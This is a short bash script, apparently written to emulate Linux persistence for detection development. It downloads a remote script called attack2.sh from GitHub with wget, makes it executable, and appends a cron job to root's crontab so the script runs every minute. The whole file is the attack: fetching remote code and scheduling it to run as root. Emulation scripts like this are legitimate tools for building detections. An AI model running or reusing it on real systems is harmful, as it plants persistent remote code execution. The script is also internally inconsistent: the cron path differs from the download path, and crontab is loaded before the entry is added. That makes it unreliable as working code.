#!/bin/bash

mkdir /tmp/persistencetest/

#Grab the attack script
wget "https://raw.githubusercontent.com/mikecybersec/DetectionDevelopment/main/hello.sh" -O /tmp/persistencetest/attack2.sh

#Wait for 5 seconds
sleep 5

chmod +x /tmp/persistencetest/attack2.sh

sleep 5
touch /var/spool/cron/root
/usr/bin/crontab /var/spool/cron/root 


#Create cron job to execute attack script every 1 minute
echo "creating cron job"
echo "*/1 * * * * sh /tmp/persistence/attack2.sh" >> /var/spool/cron/root


# crontab -u username -l to list the crontab for the user